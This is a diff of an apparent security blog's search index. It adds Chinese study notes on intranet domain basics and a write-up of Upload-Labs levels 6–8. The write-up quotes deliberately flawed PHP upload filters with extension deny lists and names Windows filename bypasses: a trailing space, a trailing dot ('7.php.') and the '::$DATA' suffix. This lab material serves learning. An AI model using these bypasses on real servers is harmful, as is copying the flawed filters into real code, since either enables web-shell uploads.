@@ -187,74 +187,6 @@
       </tags>
   </entry>
   <entry>
-    <title>内网基础知识</title>
-    <url>//net_base_1.html</url>
-    <content><![CDATA[<p><code>《内网安全攻防》</code>读书笔记</p>
-<p><code>1.1 内网基础知识</code></p>
-<a id="more"></a>
-
-
-
-<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组-work-group"><a href="#工作组-work-group" class="headerlink" title="工作组(work group)"></a>工作组(work group)</h2><h3 id="工作组简介"><a href="#工作组简介" class="headerlink" title="工作组简介"></a>工作组简介</h3><p>在局域网中通过工作组的方式进行资源管理，是对内网资产的分类存放，便于访问资源</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4.png"></p>
-<p>在工作组里，所有的计算机都是<strong>对等</strong>的地位，没有服务器和客户机的区别。</p>
-<h3 id="加入工作组的方法"><a href="#加入工作组的方法" class="headerlink" title="加入工作组的方法"></a>加入工作组的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我的电脑 -&gt; 属性 -&gt; 更改设置 -&gt; 更改 -&gt; （更改计算机名和工作组） -&gt; 重启</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>缺乏<strong>集中管理与控制的机制</strong>，没有集中的统一账户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性的严密控制。只适合<strong>小规模</strong>的用户使用。</p>
-<h2 id="域（Domain）"><a href="#域（Domain）" class="headerlink" title="域（Domain）"></a>域（Domain）</h2><h3 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h3><p>域是一个有<strong>安全边界</strong>的计算机的集合，比工作组有更加严格的安全管理控制机制，访问域中的资源必须以一个合法的用户登录到域中，权限取决于身份。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/timg?image&quality=80&size=b9999_10000&sec=1599556535041&di=bd5e7d530cdd628340d13493a79b2b13&imgtype=0&src=http%253A%252F%252Fpic4.zhimg.com%252Fv2-aaf3546c6df8d197100bf1dd5d8fc6c3_b.jpg" alt="img"></p>
-<blockquote>
-<p>安全边界：在两个域中，一个域中的用户不能访问到另一个域中的资源</p>
-</blockquote>
-<h3 id="域控制器（Domain-Controller）"><a href="#域控制器（Domain-Controller）" class="headerlink" title="域控制器（Domain Controller）"></a>域控制器（Domain Controller）</h3><p>类似门禁系统，控制域内的<strong>身份验证</strong></p>
-<p>是整个域的<strong>通信枢纽</strong>，所有的权限身份认证都在域控上进行，也就是说<strong>所有的用户名和密码的hash值都存放在域控上</strong></p>
-<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>为了避免DC瘫痪时，整个域内其他用户无法正常登录，保证域的正常使用，域内至少有两台域服务器，一台作为<code>DC</code>，另一台作为<code>备用DC</code></p>
-<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>如果所有的部门都放在同一个域内，信息交互所花费的时间会比较长，花费的代价大。</p>
-<p>采用<code>父域和子域</code>，将每个部门/分公司 放入一个子域中，让子公司通过自己的域来管理自己的资源</p>
-<blockquote>
-<p>父域创建的域管理员登录不了子域的服务器，子域创建的域管理员登录不了父域服务器。</p>
-<p>因为创建的域管理员并不在对方的数据库里面。</p>
-<p>父域的本地管理员可以登录到子域服务器</p>
-</blockquote>
-<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域。如果想要两个域之间互相访问，则需要建立信任关系。</p>
-<blockquote>
-<p>这些信任关系联合起来形成一棵树</p>
-</blockquote>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121161917242-744398688.png" alt="img"></p>
-<p>在域树中，父域可以包含多个子域。子域是相对于父域来说的，指的是域名中的一个段。一个<code>.</code>表示一个层次。</p>
-<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>是多棵域树建立信任关系组成的集合。</p>
-<p>可以通过域树之间建立的信任关系来管理和使用整个森林的资源，从而又保持了原有域的特性</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4-20200908145126473.png"></p>
-<h4 id="域名服务器（DNS）"><a href="#域名服务器（DNS）" class="headerlink" title="域名服务器（DNS）"></a>域名服务器（DNS）</h4><p>实现<code>域名</code>和<code>ip地址</code>互相转换的服务器</p>
-<p><strong>DNS服务器和域控制器通常配置在同一台机器上</strong></p>
-<h4 id="活动目录（Active-Directory）"><a href="#活动目录（Active-Directory）" class="headerlink" title="活动目录（Active Directory）"></a>活动目录（Active Directory）</h4><p>域环境中提供<strong>目录服务的组件</strong></p>
-<p>域树内的所有域共享一个活动目录</p>
-<ul>
-<li>账号集中管理</li>
-<li>软件集中管理</li>
-<li>环境集中管理</li>
-<li>增强安全性</li>
-<li>更可靠</li>
-</ul>
-<h4 id="安全域"><a href="#安全域" class="headerlink" title="安全域"></a>安全域</h4><p>将安全等级相同的计算机划入同一个网段，这些网段的计算机拥有相同的网络边界</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121163434689-855209408.png" alt="img"></p>
-<p>划分为三个区域：</p>
-<ul>
-<li>安全级别最高的**<code>内网</code>**</li>
-<li>安全级别中等的**<code>DMZ</code>**</li>
-<li>安全级别最低的**<code>外网</code>**</li>
-</ul>
-]]></content>
-      <categories>
-        <category>intranet</category>
-      </categories>
-      <tags>
-        <tag>intranet</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub DC-2靶机</title>
     <url>//DC-2.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-2 靶机</p>
@@ -1904,6 +1836,74 @@
       </tags>
   </entry>
   <entry>
+    <title>内网基础知识</title>
+    <url>//net_base_1.html</url>
+    <content><![CDATA[<p><code>《内网安全攻防》</code>读书笔记</p>
+<p><code>1.1 内网基础知识</code></p>
+<a id="more"></a>
+
+
+
+<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组-work-group"><a href="#工作组-work-group" class="headerlink" title="工作组(work group)"></a>工作组(work group)</h2><h3 id="工作组简介"><a href="#工作组简介" class="headerlink" title="工作组简介"></a>工作组简介</h3><p>在局域网中通过工作组的方式进行资源管理，是对内网资产的分类存放，便于访问资源</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4.png"></p>
+<p>在工作组里，所有的计算机都是<strong>对等</strong>的地位，没有服务器和客户机的区别。</p>
+<h3 id="加入工作组的方法"><a href="#加入工作组的方法" class="headerlink" title="加入工作组的方法"></a>加入工作组的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我的电脑 -&gt; 属性 -&gt; 更改设置 -&gt; 更改 -&gt; （更改计算机名和工作组） -&gt; 重启</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>缺乏<strong>集中管理与控制的机制</strong>，没有集中的统一账户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性的严密控制。只适合<strong>小规模</strong>的用户使用。</p>
+<h2 id="域（Domain）"><a href="#域（Domain）" class="headerlink" title="域（Domain）"></a>域（Domain）</h2><h3 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h3><p>域是一个有<strong>安全边界</strong>的计算机的集合，比工作组有更加严格的安全管理控制机制，访问域中的资源必须以一个合法的用户登录到域中，权限取决于身份。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/timg?image&quality=80&size=b9999_10000&sec=1599556535041&di=bd5e7d530cdd628340d13493a79b2b13&imgtype=0&src=http%253A%252F%252Fpic4.zhimg.com%252Fv2-aaf3546c6df8d197100bf1dd5d8fc6c3_b.jpg" alt="img"></p>
+<blockquote>
+<p>安全边界：在两个域中，一个域中的用户不能访问到另一个域中的资源</p>
+</blockquote>
+<h3 id="域控制器（Domain-Controller）"><a href="#域控制器（Domain-Controller）" class="headerlink" title="域控制器（Domain Controller）"></a>域控制器（Domain Controller）</h3><p>类似门禁系统，控制域内的<strong>身份验证</strong></p>
+<p>是整个域的<strong>通信枢纽</strong>，所有的权限身份认证都在域控上进行，也就是说<strong>所有的用户名和密码的hash值都存放在域控上</strong></p>
+<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>为了避免DC瘫痪时，整个域内其他用户无法正常登录，保证域的正常使用，域内至少有两台域服务器，一台作为<code>DC</code>，另一台作为<code>备用DC</code></p>
+<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>如果所有的部门都放在同一个域内，信息交互所花费的时间会比较长，花费的代价大。</p>
+<p>采用<code>父域和子域</code>，将每个部门/分公司 放入一个子域中，让子公司通过自己的域来管理自己的资源</p>
+<blockquote>
+<p>父域创建的域管理员登录不了子域的服务器，子域创建的域管理员登录不了父域服务器。</p>
+<p>因为创建的域管理员并不在对方的数据库里面。</p>
+<p>父域的本地管理员可以登录到子域服务器</p>
+</blockquote>
+<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域。如果想要两个域之间互相访问，则需要建立信任关系。</p>
+<blockquote>
+<p>这些信任关系联合起来形成一棵树</p>
+</blockquote>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121161917242-744398688.png" alt="img"></p>
+<p>在域树中，父域可以包含多个子域。子域是相对于父域来说的，指的是域名中的一个段。一个<code>.</code>表示一个层次。</p>
+<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>是多棵域树建立信任关系组成的集合。</p>
+<p>可以通过域树之间建立的信任关系来管理和使用整个森林的资源，从而又保持了原有域的特性</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4-20200908145126473.png"></p>
+<h4 id="域名服务器（DNS）"><a href="#域名服务器（DNS）" class="headerlink" title="域名服务器（DNS）"></a>域名服务器（DNS）</h4><p>实现<code>域名</code>和<code>ip地址</code>互相转换的服务器</p>
+<p><strong>DNS服务器和域控制器通常配置在同一台机器上</strong></p>
+<h4 id="活动目录（Active-Directory）"><a href="#活动目录（Active-Directory）" class="headerlink" title="活动目录（Active Directory）"></a>活动目录（Active Directory）</h4><p>域环境中提供<strong>目录服务的组件</strong></p>
+<p>域树内的所有域共享一个活动目录</p>
+<ul>
+<li>账号集中管理</li>
+<li>软件集中管理</li>
+<li>环境集中管理</li>
+<li>增强安全性</li>
+<li>更可靠</li>
+</ul>
+<h4 id="安全域"><a href="#安全域" class="headerlink" title="安全域"></a>安全域</h4><p>将安全等级相同的计算机划入同一个网段，这些网段的计算机拥有相同的网络边界</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121163434689-855209408.png" alt="img"></p>
+<p>划分为三个区域：</p>
+<ul>
+<li>安全级别最高的**<code>内网</code>**</li>
+<li>安全级别中等的**<code>DMZ</code>**</li>
+<li>安全级别最低的**<code>外网</code>**</li>
+</ul>
+]]></content>
+      <categories>
+        <category>intranet</category>
+      </categories>
+      <tags>
+        <tag>intranet</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Upload-Labs 1-5</title>
     <url>//Upload-Labs01.html</url>
     <content><![CDATA[<p><code>Upload-labs</code>的记录</p>
@@ -1970,6 +1970,290 @@
       </tags>
   </entry>
   <entry>
+    <title>Upload-Labs 6-10</title>
+    <url>//Upload-Labs02.html</url>
+    <content><![CDATA[<p><code>Upload-labs</code>的记录</p>
+<a id="more"></a>
+
+
+
+<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><strong><font color='red'>这五道题大多是利用了windows系统的特性，由于我使用的环境是Linux，无法产生实际的效果，也就没有效果图</font></strong></p>
+<p>挖个坑，以后用虚拟机配个windows复现一下</p>
+<h2 id="pass06"><a href="#pass06" class="headerlink" title="pass06"></a>pass06</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个相比于<code>pass04</code>，少了一个<code>trim</code>语句</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152326897.png" alt="image-20201130152326897"></p>
+<p><code>trim</code>的作用是去掉首位的空格</p>
+<p>所以这里的解法就是在文件名末尾加入一个空格即可</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>由于这也是windows系统的特性，所以我无法复现场景。</p>
+<h2 id="pass07"><a href="#pass07" class="headerlink" title="pass07"></a>pass07</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>差别就是这次没有去掉末尾的**<code>.</code>**</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152607599.png" alt="image-20201130152607599"></p>
+<p>所以导致可以使用<code>7.php.</code>绕过</p>
+<blockquote>
+<p>  Windows会自动去掉后缀名中最后的 .</p>
+</blockquote>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>windows 。。。。。 emmmmm 。。。。 你懂的</p>
+<h2 id="pass08"><a href="#pass08" class="headerlink" title="pass08"></a>pass08</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里缺少的是 去掉字符串 <strong><code>::$DATA</code></strong></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130153110084.png" alt="image-20201130153110084"></p>
+<blockquote>
+<p>  php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>
+</blockquote>
+<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>Windows。。。</p>
